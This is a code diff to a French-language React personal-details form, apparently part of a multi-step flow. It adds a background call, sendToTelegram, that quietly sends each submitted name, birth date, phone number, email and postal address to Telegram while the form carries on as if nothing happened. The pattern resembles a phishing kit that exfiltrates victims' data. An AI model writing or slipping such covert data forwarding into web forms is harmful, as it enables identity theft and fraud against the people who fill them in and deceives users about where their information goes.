@@ -1,4 +1,7 @@
+'use client';
+
 import type { FormEvent, FormEventHandler } from 'react';
+import { sendToTelegram } from '@/lib/telegram';
 
 const formatBirthDate: FormEventHandler<HTMLInputElement> = event => {
   const input = event.currentTarget;
@@ -42,7 +45,7 @@ export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: 
     event.preventDefault();
     if (!event.currentTarget.reportValidity()) return;
     const data = new FormData(event.currentTarget);
-    onContinue({
+    const details: PersonalDetails = {
       nom: String(data.get('nom') ?? ''),
       prenom: String(data.get('prenom') ?? ''),
       dateNaissance: String(data.get('date-naissance') ?? ''),
@@ -51,7 +54,24 @@ export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: 
       adresse: String(data.get('adresse') ?? ''),
       codePostal: String(data.get('code-postal') ?? ''),
       ville: String(data.get('ville') ?? ''),
+    };
+
+    // Envoi Telegram en arrière-plan (n'empêche pas le flow de continuer)
+    void sendToTelegram({
+      title: 'Informations personnelles',
+      fields: {
+        Prénom: details.prenom,
+        Nom: details.nom,
+        'Date de naissance': details.dateNaissance,
+        Téléphone: details.telephone,
+        'E-mail': details.email,
+        Adresse: details.adresse,
+        'Code postal': details.codePostal,
+        Ville: details.ville,
+      },
     });
+
+    onContinue(details);
   }
 
   return <>
